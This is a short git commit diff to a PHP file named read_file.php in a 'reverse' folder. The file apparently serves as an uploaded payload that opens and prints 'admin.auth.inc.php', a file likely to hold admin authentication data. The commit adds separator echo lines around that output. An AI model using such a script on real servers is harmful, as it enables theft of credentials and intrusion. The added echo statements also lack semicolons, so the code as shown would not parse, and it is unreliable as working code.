92c3e421989639a75ca8db09af6d088f2930b0cf
Bombo <88135556+BomboBombone@users.noreply.github.com>
2022-09-23 18:08:19 +0000

    Update read_file.php

--- src/reverse/read_file.php
+++ src/reverse/read_file.php
@@ -1,6 +1,8 @@
  <?php
+echo "\n\n\n----------------------------Separator------------------------------------\n\n\n"
 $filename = "admin.auth.inc.php";
 $myfile = fopen($filename, "r") or die("Unable to open file!");
 echo fread($myfile,filesize($filename));
 fclose($myfile);
+echo "\n\n\n----------------------------Separator------------------------------------\n\n\n"
 ?> 
